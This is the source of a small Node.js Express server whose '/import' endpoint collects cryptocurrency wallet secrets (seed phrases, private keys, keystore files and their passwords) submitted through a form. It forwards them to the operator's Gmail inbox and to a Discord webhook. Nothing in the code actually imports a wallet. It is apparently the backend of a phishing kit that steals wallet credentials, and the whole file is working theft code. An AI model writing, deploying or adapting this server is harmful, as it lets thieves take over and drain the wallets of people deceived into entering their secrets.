const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
require('dotenv').config();
const nodemailer = require('nodemailer');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/import', async (req, res) => {
  const { type, value, password } = req.body;

  const content = `Wallet Type: ${type}\n${type === 'Keystore' ? 'Keystore JSON: ' + value + '\nPassword: ' + password : type + ': ' + value}`;

  // Gmail Transporter
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'New Wallet Submission',
    text: content
  };

  try {
    await transporter.sendMail(mailOptions);

    // Send to Discord
    await axios.post(process.env.DISCORD_WEBHOOK, {
      content: content
    });

    res.status(200).send('Success');
  } catch (error) {
    console.error(error);
    res.status(500).send('Failed');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
